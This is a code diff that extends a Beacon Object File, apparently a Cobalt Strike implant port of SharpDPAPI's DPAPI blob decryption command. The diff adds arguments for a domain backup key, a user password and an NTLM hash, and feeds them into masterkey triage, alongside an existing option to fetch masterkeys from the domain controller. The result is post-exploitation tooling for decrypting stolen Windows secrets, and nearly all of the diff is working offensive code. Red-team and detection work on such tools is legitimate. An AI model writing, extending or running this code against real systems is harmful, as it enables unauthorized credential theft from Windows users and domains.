@@ -2,7 +2,8 @@
  * blob.c — BOF for describing/decrypting a raw DPAPI blob
  *
  * Usage:
- *   blob /target:BASE64_BLOB [/credkey:KEY] [/unprotect] [/rpc]
+ *   blob /target:BASE64_BLOB [/pvk:BASE64] [/password:PASS] [/ntlm:HASH]
+ *        [/credkey:KEY] [/unprotect] [/rpc]
  *
  * Parses and optionally decrypts a DPAPI blob.
  */
@@ -17,12 +18,17 @@ void go(char* args, int args_len) {
     BeaconDataParse(&parser, args, args_len);
 
     char* blob_b64   = BeaconDataExtract(&parser, NULL);
+    char* pvk_b64    = BeaconDataExtract(&parser, NULL);
+    char* password   = BeaconDataExtract(&parser, NULL);
+    char* ntlm       = BeaconDataExtract(&parser, NULL);
     char* credkey    = BeaconDataExtract(&parser, NULL);
     int   unprotect  = BeaconDataInt(&parser);
     int   use_rpc    = BeaconDataInt(&parser);
 
     if (!blob_b64 || strlen(blob_b64) == 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] Usage: blob /target:BASE64_BLOB [/credkey:KEY] [/unprotect]\n");
+        BeaconPrintf(CALLBACK_ERROR,
+            "[!] Usage: blob /target:BASE64_BLOB [/pvk:BASE64] [/password:PASS] "
+            "[/ntlm:HASH] [/credkey:KEY] [/unprotect] [/rpc]\n");
         return;
     }
 
@@ -33,6 +39,12 @@ void go(char* args, int args_len) {
         BeaconPrintf(CALLBACK_ERROR, "[!] Failed to decode base64 blob\n");
         return;
     }
+
+    /* Decode PVK if provided */
+    BYTE* pvk = NULL;
+    int pvk_len = 0;
+    if (pvk_b64 && strlen(pvk_b64) > 0)
+        pvk = base64_decode(pvk_b64, &pvk_len);
 
     MASTERKEY_CACHE cache;
     mk_cache_init(&cache);
@@ -61,10 +73,14 @@ void go(char* args, int args_len) {
         }
     }
 
-    /* If /rpc, triage masterkeys via domain controller */
-    if (use_rpc) {
-        triage_user_masterkeys(&cache, NULL, 0,
-            NULL, NULL, NULL, TRUE, NULL, NULL, FALSE, NULL);
+    /* Triage masterkeys if pvk/password/ntlm/rpc provided */
+    if (pvk || use_rpc ||
+        (password && strlen(password) > 0) ||
+        (ntlm && strlen(ntlm) > 0)) {
+        triage_user_masterkeys(&cache, pvk, pvk_len,
+            (password && strlen(password) > 0) ? password : NULL,
+            (ntlm && strlen(ntlm) > 0) ? ntlm : NULL,
+            NULL, (BOOL)use_rpc, NULL, NULL, FALSE, NULL);
     }
 
     BeaconPrintf(CALLBACK_OUTPUT, "\n=== SharpDPAPI Blob Describe (BOF) ===\n");
@@ -75,5 +91,6 @@ void go(char* args, int args_len) {
                         NULL);
 
     mk_cache_free(&cache);
+    if (pvk) intFree(pvk);
     intFree(blob_data);
 }
